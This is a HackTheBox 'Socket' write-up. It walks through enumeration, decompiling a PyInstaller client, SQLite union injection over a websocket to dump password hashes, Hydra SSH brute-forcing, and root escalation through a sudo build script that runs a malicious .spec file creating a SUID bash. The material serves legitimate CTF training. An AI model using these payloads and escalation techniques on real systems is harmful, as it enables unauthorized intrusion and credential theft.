---
title: HTB - Socket
author: nirajkharel
date: 2023-07-16 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — Socket
================

A detailed walkthrough for solving Socket Box on HTB. The box contains vulnerability like SQLite Injection, Weak Hashing and privilege escalation through SUDO shell scaping.

![](https://cdn-images-1.medium.com/max/2000/1*wcCJ9mN0SCHJaZ0YWTyWfA.png)

## Enumeration

### NMAP

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

    nmap -sC -sV -oA nmap/10.10.11.206 10.10.11.206 -vv

    PORT     STATE    SERVICE     REASON      VERSION
    22/tcp   open     ssh         syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
    |   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
    80/tcp   open     http        syn-ack     Apache httpd 2.4.52
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Did not follow redirect to http://qreader.htb/
    1213/tcp filtered mpc-lifenet no-response
    1521/tcp filtered oracle      no-response
    3784/tcp filtered bfd-control no-response
    8009/tcp filtered ajp13       no-response
    Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add 10.10.11.206 as qreader.htb on /etc/hosts. Open [http://qreader.htb](http://qreader.htb) on the web browser.

![](https://cdn-images-1.medium.com/max/3080/1*i72FCBxs-efww07DCSLxqw.png)

It seems like the application can be used to read the QR code and can embed the text in the QR code as well. We will deal with it later on. For now let’s focus more on information gathering.

### Subdomain Enumeration

**FFUF**

    ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://qreader.htb -H 'Host: FUZZ.qreader.htb' -fw 20
    
    # Result
    
     :: Method           : GET
     :: URL              : http://qreader.htb
     :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
     :: Header           : Host: FUZZ.qreader.htb
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
     :: Filter           : Response words: 20
    ________________________________________________
    
    :: Progress: [4989/4989] :: Job [1/1] :: 97 req/sec :: Duration: [0:00:49] :: Errors: 0 ::

There was no any subdomains associated with the domain qreader.htb.

### Directory Busting

Let’s try these three tools to determine the directories on the application. I generally use combinations of these tools to enumerate a directory so that none of them are missed.

**Gobuster**

    gobuster dir -u http://qreader.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    
    # Result
    /report               (Status: 200) [Size: 4161]
    /reader               (Status: 405) [Size: 153]

**Dirsearch**

    python3 dirsearch.py -r -u http://qreader.htb -i 200,302,301
    
    # Result
    Target: http://qreader.htb/
    
    [14:30:40] Starting: 
    [14:31:54] 302 -  189B  - /download/history.csv  ->  /
    [14:31:54] 302 -  189B  - /download/users.csv  ->  /
    [14:32:44] 200 -    4KB - /report
    
    Task Completed

**Feroxbuster**

    feroxbuster -u http://qreader.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    # Result
    200      197l      302w     4161c http://qreader.htb/report
    405        5l       20w      153c http://qreader.htb/embed
    405        5l       20w      153c http://qreader.htb/reader
    403        9l       28w      276c http://qreader.htb/server-status

Using these three tools, we can find a directory /report which responds with 200 OK. We will navigate into it later on.

### Technologies Used

### WhatWeb

    whatweb qreader.htb
    http://qreader.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@qreader.htb], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.206], JQuery[3.4.1], Python[3.10.6], Script[text/javascript], Werkzeug[2.1.2], X-UA-Compatible[ie=edge]

**Curl**

    curl -I qreader.htb
    HTTP/1.1 200 OK
    Date: Sun, 02 Apr 2023 08:52:07 GMT
    Server: Werkzeug/2.1.2 Python/3.10.6
    Content-Type: text/html; charset=utf-8
    Content-Length: 6992

We can see that the application is built upon Python and probably Flask is used as a framework. We need to note down their versions to enumerate if any existing vulnerabilities are available.

### Surfing the application

Logging every requests on the burp, let’s start surfing the application and investigate the /reports directory as well.

There are two main endpoints here **/reader** and **/reports**, **/reader** is used while POST method is used for upload the QR image and **/report**s is used to submit some contact messages.

There is also the download links for Windows and Linux, let’s download both the files and see if it gives any more information.

![](https://cdn-images-1.medium.com/max/2334/1*9HDFkWTXK11c7-DzcFW1Og.png)

Downloaded the binary file and tried to run locally but there was some python dependencies error on it. Seems like it is compiled on the different version of python than that I have it installed on my machine. I didn’t discovered anything interesting on the web application. Since the box name is socket, I tried if we could intercept any socket communication on the application. But that didn’t happened as well.

But when I viewed the strings characters from the binary, I found the usage of socket in it.

![](https://cdn-images-1.medium.com/max/2000/1*AZUtXn8Ztu9pEX4lr8TgaA.png)

There can be some socket related vulnerabilities on the machine. Let’s decode the application using [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor).

Also, let’s download the executable binary files from the application as shown above and unzip it. Download from [http://qreader.htb/download/windows](http://qreader.htb/download/windows)

    unzip QReader_win_v0.0.2.zip
    
    Archive:  QReader_win_v0.0.2.zip
       creating: app/
      inflating: app/qreader.exe         
      inflating: app/test.png  

    git clone https://github.com/extremecoders-re/pyinstxtractor
    cd pyinstxtractor
    pyinstxtractor.py app/qreader.exe
    
    [+] Processing qreader.exe                                                                                                                                                                                                   
    [+] Pyinstaller version: 2.1+                                                                                                                                                                                                
    [+] Python version: 3.9                                                                                                                                                                                                      
    [+] Length of package: 89947789 bytes                                                                                                                                                                                        
    [+] Found 176 files in CArchive                                                                                                                                                                                              
    [+] Beginning extraction...please standby                                                                                                                                                                                    
    [+] Possible entry point: pyiboot01_bootstrap.pyc                                                                                                                                                                            
    [+] Possible entry point: pyi_rth_inspect.pyc                                                                                                                                                                                
    [+] Possible entry point: pyi_rth_pkgutil.pyc                                                                                                                                                                                
    [+] Possible entry point: pyi_rth_multiprocessing.pyc                                                                                                                                                                        
    [+] Possible entry point: pyi_rth_pyqt5.pyc                                                                                                                                                                                  
    [+] Possible entry point: pyi_rth_setuptools.pyc                                                                                                                                                                             
    [+] Possible entry point: pyi_rth_pkgres.pyc                                                                                                                                                                                 
    [+] Possible entry point: pyi_rth_win32comgenpy.pyc                                                                                                                                                                          
    [+] Possible entry point: pyi_rth_pywintypes.pyc                                                                                                                                                                             
    [+] Possible entry point: pyi_rth_pythoncom.pyc                                                                                                                                                                              
    [+] Possible entry point: qreader.pyc                                                                                                                                                                                        
    [!] Warning: This script is running in a different Python version than the one used to build the executable.                                                                                                                 
    [!] Please run this script in Python 3.9 to prevent extraction errors during unmarshalling                                                                                                                                   
    [!] Skipping pyz extraction                                                                                                                                                                                                  
    [+] Successfully extracted pyinstaller archive: qreader.exe                                                                                                                                                                  
                                                                                                                                                                                                                                 
    You can now use a python decompiler on the pyc files within the extracted directory

There will be multiple pyc file created when exe is decompiled. For now let’s focus on **qreader.pyc** file since it should contain the main source code.

I tried decompiling qreader.pyc file using a Python module called [uncompyle6](https://pypi.org/project/uncompyle6/) but got some dependencies error. You can try decompiling the file using below commands. May be it works for you.

    pip3 install uncompyle6
    uncompyle6 -o . qreader.pyc

The module uncompyle6 does not currently supports for the binaries compiled from python 3.9 and above. You can follow this issue threads for more information.
[Please add python3.9 and above to uncompyle6 · Issue #331](https://github.com/rocky/python-uncompyle6/issues/331)

I tried downgrading the python version to 3.8, installed uncompyle6 but it does not de compile the binary if it is compiled with 3.9 version.

Later on I found another tool which works with python 3.9 as well.
[GitHub - zrax/pycdc: C++ python bytecode disassembler and decompiler](https://github.com/zrax/pycdc)

    git clone https://github.com/zrax/pycdc.git
    cd pycdc
    cmake CMakeLists.txt
    make

After successful installation of **pycdc,** we can see two executables files there **pycdas** and **pycdc. pycdas** is used to disassembly pyc file into byte-code **and** pycdc is used to disassembly pyc file into source code.

    ./pycdas qreader.pyc

![](https://cdn-images-1.medium.com/max/2000/1*G_ICp63W0eeip0k8n1f5zQ.png)

I found some interesting chunk of code here which shows that the box contains **5789** port which can be used to connect via web-socket. In the NMAP scanning before, I didn’t discover this port open. But when I scanned the specific port again using NMAP the port is shown opened. May be I need some extra research on NMAP port scanning ;)

    nmap -p5789 qreader.htb
    Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-04 22:37 +0545
    Nmap scan report for qreader.htb (10.10.11.206)
    Host is up (0.28s latency).
    
    PORT     STATE SERVICE
    5789/tcp open  unknown

Let’s disassemble pyc file into source-code for further analysis.

    ./pycdc qreader.pyc | tee qreader.py

## Initial Access

Looking at the code between lines 93–103, we can see that the application accepts connection through web socket to /version endpoint. It takes **version** as a parameter and checks if the version is available or not. To do this, there must be the version information stored on the database.

        def version(self):
            response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
                'version': VERSION })))
            data = json.loads(response)
            if 'error' not in data.keys():
                version_info = data['message']
                msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
                self.statusBar().showMessage(msg)
            else:
                error = data['error']
                self.statusBar().showMessage(error)

Let’s develop our own python script and re-create the above code.

    import json
    from websocket import create_connection
    
    data = input("Enter Data: ")
    
    web_soc = create_connection('ws://qreader.htb:5789/version')
    web_soc.send(json.dumps({'version': data}))
    result = web_soc.recv()
    print(result)
    web_soc.close()

The above code takes a string as input, connects to web-socket **ws://qreader.htb:5789/version** and pass the data on version parameter. Upon running, the above code executes as.

    python3 websocketVersion.py 
    Enter Data: test
    {"message": "Invalid version!"}
    
    python3 websocketVersion.py
    Enter Data: 1.4
    {"message": "Invalid version!"}

Let’s check if we could perform SQL injection here. We will modify the script above and implement the While loop so that we can enter payload multiple times.

    import json
    from websocket import create_connection
    
    while True:
        payload = input("Enter Payload: ")
    
        web_soc = create_connection('ws://qreader.htb:5789/version')
        web_soc.send(json.dumps({'version': payload}))
        result = web_soc.recv()
        print(result)
        web_soc.close()

Run the above code and enter single quote. It responds with Invalid Version error but when we enter the double quote, it does not responds with any data. And when we join the query with a comment **-- -**, it responds with Invalid Version again. We can see that we were able to break the query with double quote and join it with a comment.

![](https://cdn-images-1.medium.com/max/2000/1*JAdG1sJCfW1CsMd0I42bCw.png)

Since Flask uses SQLite database by default, let’s see how we can move forward with this injection.

[You can find the SQLite Injection payload here.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

First we will try to enumerate the number of columns with `order by` query.

    " order by 5 -- - 
    " union select null,null,null,null; -- -

![](https://cdn-images-1.medium.com/max/2000/1*q9Tr_tZP9dTB06Gq-QabaA.png)

We can see that there are 4 columns and we should be able to insert our payload there. Let’s try if we could enumerate the database version.

    " union select sqlite_version(),null,null,null -- -

![](https://cdn-images-1.medium.com/max/2000/1*li7Ofo2Snv9nCWj6kUBHVw.png)

We got the database version as well. Now let’s enumerate the database structure.

    " union select sql,null,null,null from sqlite_schema;

![](https://cdn-images-1.medium.com/max/2070/1*MEVTi_sv_73nffFDPzzs6g.png)

List down the current table name from the database.

    " union select tbl_name,null,null,null FROM sqlite_master; WHERE name='user'-- -

![](https://cdn-images-1.medium.com/max/2000/1*NkZpe_dYMgFyQb_sTuVf4Q.png)

Let’s group the table name so that we can enumerate other tables as well. [You can learn more about it here.](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)

    " union select group_concat(name),null,null,null FROM sqlite_schema WHERE type='table'; -- -

![](https://cdn-images-1.medium.com/max/2080/1*htPriciRxIax5SixKqrgHw.png)

We can see an interesting table called users. Let’s enumerate the columns on it. We can find more interesting column names called **username** and **password** in a table **users**.

    " union select sql,null,null,null FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='users'; -- -

![](https://cdn-images-1.medium.com/max/2070/1*ilHSOO9XalEufIe6QhKR7w.png)

Let’s dump the database **users**.

    " union select username,password,null,null FROM users; -- -

![](https://cdn-images-1.medium.com/max/2034/1*W_z6igr9b-feqk_mXEfGtg.png)

We can find the username **admin** and password **0c090c365fa0559b151a43e0fea39710**.

Since MD5 represents sequence of 32 hexadecimal digits. Let’s see if we can find its clear text value on hashes.com. You can also try it with hashcat.

![](https://cdn-images-1.medium.com/max/2160/1*rLGb41wHSAMoI_59qJ1e8w.png)

The password for the user **admin** is **denjanjade122566**. Try login it using SSH since 22 port is open on the machine.

![](https://cdn-images-1.medium.com/max/2000/1*SQYBwz9MS6U6_ryYsooPoQ.png)

But I was not able to login while trying multiple related usernames. Let’s enumerate the database again. We discovered other tables like sqlite_sequence, versions, users, info, reports, answers.

I was able to enumerate couple of usernames like **admin, jason, mike, thomas, keller** from tables **answers** and **reports.**

    " union select sql,null,null,null FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='answers'; -- -
    " union select group_concat(answer),group_concat(answered_by),null,null FROM answers; -- -
    
    " union select sql,null,null,null FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='reports'; -- -
    " union select group_concat(reporter_name),group_concat(description),null,null FROM reports; -- -

![](https://cdn-images-1.medium.com/max/2070/1*0v72r1K7aSANMO7cEnvPCQ.png)

Let’s create a list of username and perform brute force using hydra.

![](https://cdn-images-1.medium.com/max/2074/1*VNVWOZHMJnNdojEJsC5H3A.png)

Again no any valid usernames are found. But if we see the result of table **answers **closely, we can see that the answer was provided by Thomas Keller as an admin and I also knew that Thomas and Keller are not two different users. It is a first name and last name. So we might need some combinations of first name and last name suffix called [username anarchy](https://github.com/urbanadventurer/username-anarchy).

    git clone https://github.com/urbanadventurer/username-anarchy.git
    cd username-anarchy
    
    echo "Thomas Keller" > fullname
    ruby username-anarchy -i fullname
    
    # Result
    thomas
    thomaskeller
    thomas.keller
    thomaske
    thomkell
    thomask
    t.keller
    tkeller
    kthomas
    k.thomas
    kellert
    keller
    keller.t
    keller.thomas
    tk

We can find the list of combined usernames here. Let’s perform bruteforce again using above usernames.

    hydra -L users -p denjanjade122566 10.10.11.206 ssh

![](https://cdn-images-1.medium.com/max/2080/1*Ui4UMjnv08B4eGBPqXnxGA.png)

And we finally got the username which is called **tkeller**. Login using SSH.

![](https://cdn-images-1.medium.com/max/2000/1*p9fc7quxgTFXyW6_nPKZfQ.png)

Got the user.txt file.

![](https://cdn-images-1.medium.com/max/2000/1*HEEfaQSm1jXwIj9qxvDaNA.png)

## Privilege Escalation

Looking at the result of **sudo -l** command, we can see that the user tkeller can run command **/usr/local/sbin/build-installer.sh** using sudo permission without providing password.

![](https://cdn-images-1.medium.com/max/2292/1*eu5UBQY3jndFMbitJmRvCQ.png)

Let’s analyze what that command **build-installer.sh** contains.

    cat /usr/local/sbin/build-installer.sh
    
    #!/bin/bash
    if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
      /usr/bin/echo "No enough arguments supplied"
      exit 1;
    fi
    
    action=$1
    name=$2
    ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')
    
    if [[ -L $name ]];then
      /usr/bin/echo 'Symlinks are not allowed'
      exit 1;
    fi
    
    if [[ $action == 'build' ]]; then
      if [[ $ext == 'spec' ]] ; then
        /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
        /home/svc/.local/bin/pyinstaller $name
        /usr/bin/mv ./dist ./build /opt/shared
      else
        echo "Invalid file format"
        exit 1;
      fi
    elif [[ $action == 'make' ]]; then
      if [[ $ext == 'py' ]] ; then
        /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
        /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
       /usr/bin/mv ./dist ./build /opt/shared
      else
        echo "Invalid file format"
        exit 1;
      fi
    elif [[ $action == 'cleanup' ]]; then
      /usr/bin/rm -r ./build ./dist 2>/dev/null
      /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
      /usr/bin/rm /tmp/qreader* 2>/dev/null
    else
      /usr/bin/echo 'Invalid action'
      exit 1;
    fi

We can see that the above code requires two parameters, one is the action and another is filename containing extensions like spec, py. When a value build is passed as action parameter it checks whether the second parameter contains spec as extension, if it contains, it executes pyinstaller which bundles a Python application and all its dependencies into a single package.

Since the above code can be run with a sudo access. We can create a file with **spec** parameter like **exploit.spec** and execute the arbitrary commands on it. It should be executed with sudo permission.

    cat exploit.spec 
    import os
    
    
    os.system('cp /bin/bash /tmp/bash;chmod +s /tmp/bash')

For our demonstration, we have copied the /bin/bash file into the /tmp/bash and assigned the SUID permission into it. Let’s run the script now.

    sudo /usr/local/sbin/build-installer.sh build exploit.spec

![](https://cdn-images-1.medium.com/max/2000/1*f1xgp9eqSfJgNk2UGcf45Q.png)

When navigated into **/tmp** directory we can find a bash binary which has SUID permission assigned, with a **-p** parameter we can get an interactive bash shell.

![](https://cdn-images-1.medium.com/max/2000/1*PZFCWzkffyYqrGP-b0AHYA.png)

Here you go. Happy Hacking.
